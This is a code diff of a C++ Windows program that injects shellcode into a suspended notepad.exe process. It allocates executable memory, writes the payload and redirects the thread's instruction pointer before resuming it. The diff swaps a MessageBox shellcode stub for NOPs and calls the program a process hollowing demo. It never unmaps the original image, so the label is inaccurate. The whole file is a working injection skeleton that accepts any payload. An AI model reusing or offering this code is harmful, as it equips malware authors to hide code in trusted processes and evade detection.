@@ -1,50 +1,56 @@
+
 #include <windows.h>
 #include <iostream>
+
 int main() {
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     CONTEXT ctx;
     ctx.ContextFlags = CONTEXT_FULL;
+
     // Target process (legitimate)
     LPCSTR targetProcess = "C:\\Windows\\System32\\notepad.exe";
+
     // Create suspended process
     if (!CreateProcessA(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
         std::cerr << "Failed to create process. Error: " << GetLastError() << std::endl;
         return 1;
     }
+
     // Get thread context
     if (!GetThreadContext(pi.hThread, &ctx)) {
         std::cerr << "Failed to get thread context. Error: " << GetLastError() << std::endl;
         return 1;
     }
-    // Simple shellcode: MessageBox
-    unsigned char shellcode[] =
-        "\x90\x90" // NOPs
-        "\x6A\x00" // push 0
-        "\x68\x65\x6C\x6C\x6F" // push "hello"
-        "\x68\x68\x61\x63\x6B" // push "hack"
-        "\x6A\x00" // push 0
-        "\xFF\x15\x00\x00\x00\x00"; // call MessageBoxA (placeholder)
+
+    // Harmless shellcode placeholder (NOPs)
+    unsigned char shellcode[] = "\x90\x90\x90\x90"; // Just NOPs for demo
     SIZE_T shellcodeSize = sizeof(shellcode);
+
     // Allocate memory in target process
     LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteMem) {
         std::cerr << "Failed to allocate memory. Error: " << GetLastError() << std::endl;
         return 1;
     }
+
     // Write shellcode
     if (!WriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcodeSize, NULL)) {
         std::cerr << "Failed to write memory. Error: " << GetLastError() << std::endl;
         return 1;
     }
-    // Update instruction pointer
-    ctx.Eip = (DWORD)remoteMem; // For x86; use Rip for x64
+
+    // Update instruction pointer (x86 only)
+    ctx.Eip = (DWORD)remoteMem;
+
     if (!SetThreadContext(pi.hThread, &ctx)) {
         std::cerr << "Failed to set thread context. Error: " << GetLastError() << std::endl;
         return 1;
     }
+
     // Resume thread
     ResumeThread(pi.hThread);
-    std::cout << "Process hollowing executed successfully." << std::endl;
+
+    std::cout << "Process hollowing demo executed successfully." << std::endl;
     return 0;
 }
